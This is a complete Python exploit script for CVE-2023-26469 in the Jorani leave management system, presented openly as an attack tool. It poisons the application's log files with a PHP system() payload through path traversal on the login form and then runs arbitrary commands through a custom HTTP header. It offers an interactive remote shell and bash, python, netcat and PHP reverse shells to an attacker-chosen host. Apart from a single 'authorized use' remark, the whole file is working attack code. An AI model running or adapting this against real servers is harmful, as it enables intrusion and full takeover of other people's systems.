#!/usr/bin/env python3
"""
CVE-2023-26469 - Jorani Log File Poisoning Exploit
POC: jrjgjk(https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py)
Enhanced by: strikoder
Version: 2.0.0

VULNERABILITY DESCRIPTION:
    CVE-2023-26469 affects Jorani leave management system.
    Path traversal vulnerability allows poisoning log files with PHP code,
    leading to remote code execution via specially crafted HTTP headers.

USAGE:
    python3 exploit.py -u <target_url> [options]
    
EXAMPLES:
    # Interactive shell mode
    python3 exploit.py -u https://target.com
    
    # Reverse shell mode
    python3 exploit.py -u https://target.com -r 10.10.14.5 4444
    
    # Single command execution
    python3 exploit.py -u https://target.com -c "whoami"
"""

import sys
import re
import base64
import random
import string
import datetime
import argparse
import readline
import requests

# Suppress SSL warnings for testing environments
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


# ==============================================================================
# CONSTANTS AND CONFIGURATION
# ==============================================================================

VERSION = "2.0.0"

# Color-coded output functions
def msg(text, end="\n"):
    """Success message in green"""
    print(f'\x1b[92m[+]\x1b[0m {text}', end=end)


def err(text, end="\n"):
    """Error message in red"""
    print(f'\x1b[91m[x]\x1b[0m {text}', end=end)


def log(text, end="\n"):
    """Info message in yellow"""
    print(f'\x1b[93m[?]\x1b[0m {text}', end=end)


def info(text, end="\n"):
    """Info message in blue"""
    print(f'\x1b[94m[*]\x1b[0m {text}', end=end)


# Regex patterns
CSRF_PATTERN = re.compile(r'<input type="hidden" name="csrf_test_jorani" value="(.*?)"')
CMD_PATTERN = re.compile(r'---------(.*?)---------', re.DOTALL)

# API endpoints
ENDPOINTS = {
    'login': '/session/login',
    'view': '/pages/view/',
}

# Generate random header name for exploit
EXPLOIT_HEADER_NAME = ''.join(random.choice(string.ascii_uppercase) for _ in range(12))

# Headers to bypass redirect
BYPASS_HEADERS = {
    'X-REQUESTED-WITH': 'XMLHttpRequest',
    EXPLOIT_HEADER_NAME: ""
}

# Pseudo-terminal prompt
SHELL_PROMPT = "\x1b[92mstrikoder\x1b[0m@\x1b[41mjorani\x1b[0m(RCE)\n$ "

# Exploit payloads
PHP_PAYLOAD = (
    f"<?php if(isset($_SERVER['HTTP_{EXPLOIT_HEADER_NAME}']))"
    f"{{system(base64_decode($_SERVER['HTTP_{EXPLOIT_HEADER_NAME}']));}} ?>"
)
PATH_TRAVERSAL = "../../application/logs"


# ==============================================================================
# REVERSE SHELL PAYLOADS
# ==============================================================================

def get_reverse_shell_payload(lhost, lport, shell_type="bash"):
    """Generate reverse shell payload based on type"""
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    }
    return payloads.get(shell_type, payloads["bash"])


# ==============================================================================
# HELPER FUNCTIONS
# ==============================================================================

def build_url(base_url, endpoint_key):
    """Construct full URL from base and endpoint"""
    return base_url + ENDPOINTS[endpoint_key]


def get_current_log_filename():
    """Generate current log filename based on date"""
    today = datetime.date.today()
    return f"log-{today.year}-{str(today.month).zfill(2)}-{str(today.day).zfill(2)}"


def extract_csrf_token(response_text):
    """Extract CSRF token from HTML response"""
    matches = re.findall(CSRF_PATTERN, response_text)
    if not matches:
        raise ValueError("CSRF token not found in response")
    return matches[0]


def execute_command(session, exploit_url, command):
    """Execute command via poisoned log file"""
    # Encode command with markers for output extraction
    cmd_bytes = b"echo ---------;" + command.encode() + b" 2>&1;echo ---------;"
    encoded_cmd = base64.b64encode(cmd_bytes)
    
    # Set command in exploit header
    headers = BYPASS_HEADERS.copy()
    headers[EXPLOIT_HEADER_NAME] = encoded_cmd
    
    # Request poisoned log file
    response = session.get(exploit_url, headers=headers, verify=False)
    
    # Extract command output
    matches = re.findall(CMD_PATTERN, response.text)
    if matches:
        return matches[0]
    else:
        return None


# ==============================================================================
# MAIN EXPLOIT LOGIC
# ==============================================================================

def poison_log_file(session, target_url, csrf_token):
    """Poison log file with PHP payload via path traversal"""
    log(f"Poisoning log file with PHP payload...")
    
    payload_data = {
        "csrf_test_jorani": csrf_token,
        "last_page": "session/login",
        "language": PATH_TRAVERSAL,
        "login": PHP_PAYLOAD,
        "CipheredValue": "DummyPassword"
    }
    
    login_url = build_url(target_url, 'login')
    response = session.post(login_url, data=payload_data, verify=False)
    
    if response.status_code == 200:
        msg("Log file successfully poisoned!")
    else:
        err(f"Unexpected response code: {response.status_code}")


def setup_exploit(target_url):
    """Setup exploit by getting CSRF token and poisoning log file"""
    session = requests.Session()
    
    info(f"Exploit header name: {EXPLOIT_HEADER_NAME}")
    log("Initiating exploit setup...")
    
    # Step 1: Get session cookie and CSRF token
    log("Requesting session cookie and CSRF token...")
    login_url = build_url(target_url, 'login')
    response = session.get(login_url, verify=False)
    
    csrf_token = extract_csrf_token(response.text)
    msg(f"Retrieved CSRF token: {csrf_token[:20]}...")
    
    # Step 2: Poison log file with PHP payload
    poison_log_file(session, target_url, csrf_token)
    
    # Step 3: Construct exploit URL
    log_filename = get_current_log_filename()
    log(f"Targeting log file: {log_filename}")
    exploit_url = target_url + ENDPOINTS['view'] + log_filename
    msg(f"Exploit ready at: {exploit_url}")
    
    return session, exploit_url


def execute_single_command(session, exploit_url, command):
    """Execute a single command and display output"""
    info(f"Executing command: {command}")
    output = execute_command(session, exploit_url, command)
    
    if output is not None:
        print("\n" + "="*60)
        print(output)
        print("="*60)
        msg("Command executed successfully!")
    else:
        err("Command execution failed or no output returned")


def launch_reverse_shell(session, exploit_url, lhost, lport):
    """Launch reverse shell to attacker machine"""
    print("\n" + "="*60)
    msg(f"Launching reverse shell to {lhost}:{lport}")
    info("Make sure your listener is ready (e.g., nc -lvnp {lport})")
    print("="*60 + "\n")
    
    # Try multiple reverse shell methods
    shell_types = ["bash", "python", "nc", "php"]
    
    for shell_type in shell_types:
        log(f"Attempting {shell_type} reverse shell...")
        payload = get_reverse_shell_payload(lhost, lport, shell_type)
        
        # Execute reverse shell payload (fire and forget)
        try:
            execute_command(session, exploit_url, payload)
            msg(f"{shell_type} payload sent!")
        except:
            err(f"{shell_type} method failed, trying next...")
            continue
    
    info("All reverse shell payloads sent. Check your listener!")


def interactive_shell(session, exploit_url):
    """Provide interactive shell via exploited vulnerability"""
    print("\n" + "="*60)
    msg("Interactive shell established!")
    info("Type 'exit' or 'quit' to terminate.")
    info("Type 'help' for available commands.")
    print("="*60 + "\n")
    
    while True:
        try:
            command = input(SHELL_PROMPT)
            
            # Handle special commands
            if command.lower() in ['exit', 'quit']:
                msg("Exiting shell...")
                break
            elif command.lower() == 'help':
                print("\nAvailable commands:")
                print("  exit/quit  - Exit the shell")
                print("  help       - Show this help message")
                print("  clear      - Clear the screen")
                print("  Any other command will be executed on the target\n")
                continue
            elif command.lower() == 'clear':
                import os
                os.system('clear' if os.name == 'posix' else 'cls')
                continue
            
            # Skip empty input
            if not command.strip():
                continue
            
            # Execute command
            output = execute_command(session, exploit_url, command)
            
            if output is not None:
                print(output)
            else:
                err("Command execution failed or no output returned")
                
        except KeyboardInterrupt:
            print("\n")
            msg("Interrupted. Exiting shell...")
            break
        except Exception as e:
            err(f"Error during command execution: {e}")


# ==============================================================================
# ARGUMENT PARSING AND MAIN
# ==============================================================================

def print_banner():
    """Display exploit banner"""
    banner = f"""
    ╔════════════════════════════════════════════════════════════╗
    ║           CVE-2023-26469 Exploit Framework                 ║
    ║          Jorani RCE via Log Poisoning v{VERSION}           ║
    ║                 Enhanced by strikoder                      ║
    ╚════════════════════════════════════════════════════════════╝
    """
    print(banner)


def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='CVE-2023-26469 - Jorani RCE Exploit',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Interactive shell mode (default)
  %(prog)s -u https://target.com

  # Execute single command
  %(prog)s -u https://target.com -c "whoami"

  # Launch reverse shell
  %(prog)s -u https://target.com -r 10.10.14.5 4444

  # Reverse shell with custom listener
  %(prog)s -u https://target.com --reverse-shell 192.168.1.100 9001

Note: Use only on systems you are authorized to test!
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target.com)')
    parser.add_argument('-c', '--command', help='Execute single command')
    parser.add_argument('-r', '--reverse-shell', nargs=2, metavar=('LHOST', 'LPORT'),
                        help='Launch reverse shell to LHOST:LPORT')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    return parser.parse_args()


def main():
    """Main exploit execution flow"""
    print_banner()
    
    args = parse_arguments()
    target_url = args.url.rstrip('/')
    
    try:
        # Setup exploit
        session, exploit_url = setup_exploit(target_url)
        
        # Execute based on mode
        if args.reverse_shell:
            lhost, lport = args.reverse_shell
            launch_reverse_shell(session, exploit_url, lhost, lport)
        elif args.command:
            execute_single_command(session, exploit_url, args.command)
        else:
            # Default: interactive shell
            interactive_shell(session, exploit_url)
        
    except requests.exceptions.RequestException as e:
        err(f"Network error: {e}")
        sys.exit(1)
    except ValueError as e:
        err(f"Exploit failed: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n")
        msg("Interrupted by user. Exiting...")
        sys.exit(0)
    except Exception as e:
        err(f"Unexpected error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
